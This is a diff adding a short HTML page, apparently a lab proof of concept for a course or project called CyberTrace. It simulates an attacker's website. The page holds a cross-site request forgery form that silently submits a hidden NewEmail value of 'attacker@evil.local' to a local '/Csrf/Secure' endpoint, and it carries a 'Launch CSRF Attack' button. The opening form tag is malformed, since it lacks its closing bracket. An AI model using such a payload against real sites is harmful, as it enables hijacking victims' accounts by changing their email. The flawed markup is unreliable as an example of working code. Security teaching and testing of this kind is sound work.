@@ -1,0 +1,26 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CyberTrace CSRF PoC</title>
+</head>
+
+<body>
+
+    <h1>CSRF Attack Demonstration</h1>
+
+    <p>This page simulates an attacker's website.</p>
+
+    <form method="post"
+          action="https://localhost:7190/Csrf/Secure"
+        <input type="hidden"
+               name="NewEmail"
+               value="attacker@evil.local">
+
+        <input type="submit"
+               value="Launch CSRF Attack">
+
+    </form>
+
+</body>
+</html>
